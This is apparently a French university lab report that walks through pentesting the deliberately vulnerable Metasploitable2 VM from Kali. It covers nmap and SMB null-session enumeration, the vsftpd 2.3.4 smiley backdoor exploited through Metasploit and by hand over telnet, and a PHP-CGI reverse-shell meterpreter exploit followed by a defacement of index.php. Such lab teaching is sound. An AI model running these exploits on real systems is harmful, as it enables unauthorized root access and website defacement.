# TP3 — Partie 2 : Kali Linux & Metasploitable2 (pentest)

> ⚠️ Cette partie **s'exécute dans VirtualBox** (deux VM). Elle ne peut pas être
> lancée depuis cette machine : les commandes, sorties attendues et réponses
> ci-dessous constituent le compte-rendu à exécuter puis à capturer en TP.
> **Metasploitable ne doit JAMAIS être exposée à un réseau hostile** (machine
> volontairement vulnérable) → réseau **NAT Network isolé** uniquement.

## Installation & configuration réseau

| | MV **Kali-Linux** (attaquant) | MV **Metasploitable** (cible) |
|---|---|---|
| Image | `Kali Linux 2022.3 (64 bit).vdi` (osboxes) | `Metasploitable.vmdk` |
| Login | voir `Info.txt` (osboxes / osboxes.org) | `msfadmin` / `msfadmin` |
| Réseau VirtualBox | **NAT Network** (`NatNetwork`) | **NAT Network** (`NatNetwork`) |
| Exemple IP | `10.0.2.5/24` | `10.0.2.6/24` |

Les deux VM dans le **même NAT Network** se voient entre elles mais sont isolées
de l'extérieur.

### Configurations physiques et logiques (à relever — « Retrouvez / Expliquez »)
Sur **chaque** machine :
```bash
ip addr          # ou ifconfig : adresse MAC (physique) + IP (logique) + masque
ip route         # passerelle par défaut
```
- **Configuration physique** = adresse **MAC** (couche 2, gravée sur la carte / la
  carte virtuelle), ex. `08:00:27:41:ce:cf`.
- **Configuration logique** = adresse **IP + masque** (couche 3, attribuée par
  DHCP du NAT Network), ex. `10.0.2.5/24`.

Exemple de tableau à reporter sur le compte-rendu :

| | MV Kali-Linux | MV Metasploitable | Machine Hôte |
|---|---|---|---|
| MAC | 08:00:27:41:ce:cf | 08:00:27:a1:f1:89 | b7:a1:12:56:e4:55 |
| IP  | 10.0.2.5/24 | 10.0.2.6/24 | 192.168.50.4/24 |

→ L'hôte est sur un **autre réseau** (192.168.50.0/24) : il n'est pas dans le NAT
Network, d'où l'isolement de Metasploitable.

### Test d'écho de niveau 3 (ICMP) — doit réussir avant de continuer
```bash
# depuis Kali
ping -c 3 10.0.2.6
```
Niveau 3 = couche réseau (IP/ICMP). Le ping doit répondre → les deux VM
communiquent.

---

## Analyse des vulnérabilités de Metasploitable

### Scan UDP
```bash
sudo nmap -sU 10.0.2.6
```
`-sU` scanne les **ports UDP** (le scan par défaut `nmap <ip>` ne couvre que le
TCP). Ports UDP typiquement ouverts : 53 (DNS), 69 (TFTP), 111 (rpcbind),
137 (netbios-ns), 2049 (NFS)…

### Énumération des utilisateurs
**Méthode 1 — script NSE `smb-enum-users` :**
```bash
nmap --script smb-enum-users.nse -p 445 10.0.2.6
```
`.nse` = *Nmap Scripting Engine*. Donne une longue liste de comptes ; parmi eux
le compte admin **`msfadmin`**.

**Méthode 2 — session nulle Samba via `rpcclient` :**
```bash
rpcclient -U "" 10.0.2.6        # session nulle = connexion SMB sans mot de passe
# (appuyer sur Entrée à la demande de mot de passe)
rpcclient $> querydominfo        # nom de domaine/serveur + nb de comptes (≈ 35)
rpcclient $> enumdomusers        # liste des 35 comptes
rpcclient $> queryuser msfadmin  # détails sur un compte : profil, mdp, etc.
```
Une **session nulle** (null session) est une connexion SMB/Samba **sans
authentification**. Activée par défaut sur les vieux systèmes (désactivée depuis
Windows XP SP2 / Server 2003). Elle fuite domaine + comptes **sans accès admin**.

### Scan de services et versions
```bash
nmap -sV 10.0.2.6
```
`-sV` identifie **service + version** sur chaque port. Le **port 21** apparaît en
premier : service **FTP = vsftpd 2.3.4**.

---

## Exploitation d'une faille de sécurité — vsftpd 2.3.4 (backdoor)

### A. Méthode automatique (Metasploit)
```bash
msfconsole
msf6 > search vsftpd
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 > show options
msf6 > set RHOSTS 10.0.2.6
msf6 > exploit            # (ou run)
```
Sortie attendue :
```
[*] 10.0.2.6:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.0.2.6:21 - USER: 331 Please specify the password.
[+] 10.0.2.6:21 - Backdoor service has been spawned, handling...
[+] 10.0.2.6:21 - UID: uid=0(root) gid=0(root)
[*] Command shell session 1 opened (10.0.2.5:37243 -> 10.0.2.6:6200)
```
→ **shell root** sur la cible (`id`, `whoami` → `root`). Vocabulaire Metasploit :
*exploit* (module qui déclenche la faille), *payload* (code exécuté après succès),
*RHOST/RPORT* (cible), *bind shell* (c'est l'attaquant qui se connecte au shell
ouvert par la cible, ici sur le port **6200**).

### B. Méthode manuelle — comprendre la backdoor
**Code source vulnérable (`str.c`) :**
```c
else if((p_str->p_buf[i]==0x3a) && (p_str->p_buf[i+1]==0x29))
{
    vsf_sysutil_extra();
}
```
Déclenchement = détection, dans l'entrée utilisateur, des deux octets
**`0x3a` puis `0x29`**.

**Représentation des deux valeurs (question du sujet) :**
- `0x3a` = **58** = caractère **`:`**
- `0x29` = **41** = caractère **`)`**

→ ensemble **`:)`** = un **smiley sourire** 🙂. Taper un login contenant `:)`
active la backdoor.

**La fonction `vsf_sysutil_extra()` (dans `sysdeputil.c`)** ouvre un socket qui
écoute sur le **port 6200** (`sa.sin_port = htons(6200)`), fait `accept()`, puis
`dup2()` les descripteurs 0/1/2 vers la socket et `execl("/bin/sh","sh",0)` :
c'est une **porte dérobée** qui offre un shell root à qui se connecte sur 6200.

**Exploitation manuelle au telnet :**
```bash
# 1) port 6200 fermé au départ (normal)
nmap -p 6200 10.0.2.6          # (ou : nc -vz 10.0.2.6 6200) -> closed

# 2) déclencher la backdoor via le login avec un smiley
telnet 10.0.2.6 21
USER smiley:)
PASS whatever

# 3) le port 6200 est maintenant OUVERT -> s'y connecter (autre terminal)
telnet 10.0.2.6 6200
id        # uid=0(root)  -> shell root manuel, sans Metasploit
```
Réf. backdoor : <https://github.com/lyndon160/vsftpd-backdoor/commit/2f8b278602e822c52f5e0d37ea7d256b888e5e85>

---

## Partie « encore plus méchant » — service web PHP vulnérable

**Version de PHP sur la cible :**
```bash
nmap -sV -p 80 10.0.2.6        # Apache + PHP 5.2.4 (vulnérable)
```
PHP 5.2.4 est **vulnérable** à la faille **PHP CGI Argument Injection**
(CVE-2012-1823).

**Trouver le module (date 2012, rank excellent) :**
```bash
msf6 > search cve:2012 type:exploit rank:excellent php cgi
# -> exploit/multi/http/php_cgi_arg_injection
msf6 > use exploit/multi/http/php_cgi_arg_injection
msf6 > show payloads
msf6 > set PAYLOAD php/meterpreter/reverse_tcp
msf6 > set RHOSTS 10.0.2.6
msf6 > set LHOST 10.0.2.5          # IP de l'attaquant (Kali)
msf6 > set LPORT 4444
msf6 > run
meterpreter >
```
**Reverse shell** : c'est la **cible** qui se connecte vers l'attaquant
(`LHOST`/`LPORT`), ce qui traverse les pare-feu sortants. `meterpreter` est un
payload avancé, exécuté **en mémoire**, pour la post-exploitation (upload/download,
captures d'écran, keylogger, `shell`, `getuid`, `sysinfo`…).

**Defacing de la page d'accueil (`index.php`) :**
```bash
meterpreter > shell
find / -name index.php 2>/dev/null         # localiser le DocumentRoot (/var/www)
echo '<h1>Owned - TP3 INFO731</h1><img src="http://.../pwn.png">' > /var/www/index.php
```
(ou `meterpreter > upload pwn.png /var/www/` puis éditer `index.php`.) Recharger
`http://10.0.2.6/` depuis le navigateur de Kali → la page est modifiée.

> Il reste d'autres services vulnérables sur Metasploitable (Samba, distccd,
> UnrealIRCd, Tomcat, PostgreSQL…) — et surtout, pour chaque faille, il faut citer
> la **contre-mesure** (voir l'oral).
